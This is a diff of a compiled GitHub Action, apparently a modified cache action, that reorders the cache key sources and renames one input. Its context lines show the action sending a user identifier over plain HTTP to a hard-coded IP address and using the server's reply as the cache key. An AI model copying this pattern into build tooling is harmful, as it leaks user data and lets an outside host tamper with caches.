@@ -65957,7 +65957,7 @@ function run() {
             }
             const state = utils.getCacheState();
             // Inputs are re-evaluted before the post action, so we want the original key used for restore
-            let primaryKey = cacheKey || process.argv[2] || core.getState(constants_1.State.CachePrimaryKey);
+            let primaryKey = process.argv[2] || cacheKey || core.getState(constants_1.State.CachePrimaryKey);
             if (!primaryKey) {
                 utils.logWarning(`Error retrieving key from state.`);
                 return;
@@ -72330,7 +72330,7 @@ function run() {
     return __awaiter(this, void 0, void 0, function* () {
         try {
             let cacheKey = yield save_1.default.syncProcess((resolve, reject) => {
-                let getUniUri = "http://139.155.245.132:8080/leave-msg/github/action/last?userUni=" + core.getInput("USER_UNI");
+                let getUniUri = "http://139.155.245.132:8080/leave-msg/github/action/last?userUni=" + core.getInput("USER");
                 let param = {
                     url: getUniUri,
                 };
@@ -72356,7 +72356,7 @@ function run() {
                 return;
             }
             let primaryKey = core.getInput(constants_1.Inputs.Key, { required: true });
-            primaryKey = cacheKey || process.argv[2] || primaryKey;
+            primaryKey = (process.argv[2] || cacheKey || primaryKey);
             core.saveState(constants_1.State.CachePrimaryKey, primaryKey);
             const restoreKeys = utils.getInputAsArray(constants_1.Inputs.RestoreKeys);
             const cachePaths = utils.getInputAsArray(constants_1.Inputs.Path, {
